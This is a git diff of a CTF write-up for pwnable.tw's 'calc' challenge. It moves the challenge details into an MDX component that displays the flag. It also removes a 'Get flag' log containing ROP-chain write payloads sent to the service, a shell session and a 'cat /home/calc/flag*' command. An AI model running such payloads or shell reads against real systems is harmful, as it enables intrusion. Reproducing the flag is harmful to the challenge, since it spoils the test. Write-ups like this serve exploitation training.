@@ -8,15 +8,16 @@ authors: ['kdot']
 draft: false
 ---
 
-## Challenge Information
-Description: `Have you ever use Microsoft calculator?`
+import Challenge from '@/components/mdx/Challenge.astro'
 
-Instance: `nc chall.pwnable.tw 10100`
-
-Tags:
-- Arbitrary Read
-- Arbitrary Write
-- ROP
+# Challenge Information
+<Challenge
+  category="pwn"
+  points={150}
+  description="Have you ever use Microsoft calculator?"
+  flag="FLAG{C:\Windows\System32\calc.exe}"
+>
+</Challenge>
 
 ## Reverse Engineering
 
@@ -535,57 +536,3 @@ if __name__ == '__main__':
 ```
 
 **P/s: For some reason (IDK) why but my payload doesn't work with the offset pool -> eip of main 🥹, so I chance to pool -> eip of calc**
-
-## Get flag
-
-```sh
-[+] Opening connection to chall.pwnable.tw on port 10100: Done
-Write b'+381+134678656'
-b'=== Welcome to SECPROG calculator ===\n'
-Write b'+380+11'
-b'134678656\n'
-Write b'+379+134989125'
-b'-620113526\n'
-Write b'+378+134932428'
-b'-939325995\n'
-Write b'+377+134566096'
-b'269452284\n'
-Write b'+376+135188352'
-b'269750492\n'
-Write b'+375+134513105'
-b'135188352\n'
-Write b'+374+135143745'
-b'269026177\n'
-Write b'+373+134566096'
-b'135143745\n'
-Write b'+372+135188452'
-b'134566096\n'
-Write b'+371+134520981'
-b'130398688\n'
-Write b'+370+134678656'
-b'129731209\n'
-Write b'+369+3'
-b'134678657\n'
-Write b'+368+134989125'
-b'134518397\n'
-Write b'+367+256'
-b'269508981\n'
-Write b'+366+134676906'
-b'135184652\n'
-Write b'+365+135154297'
-b'134676906\n'
-Write b'+364+135188352'
-b'269667369\n'
-Write b'+363+134520981'
-b'130398588\n'
-Write b'+362+0'
-b'269038793\n'
-Write b'+361+135188352'
-b'prevent division by zero\n'
-Write b'+360+134676945'
-b'269706265\n'
-[*] Switching to interactive mode
-129887033
-$ cat /home/calc/flag*
-FLAG{C:\Windows\System32\calc.exe}
-```
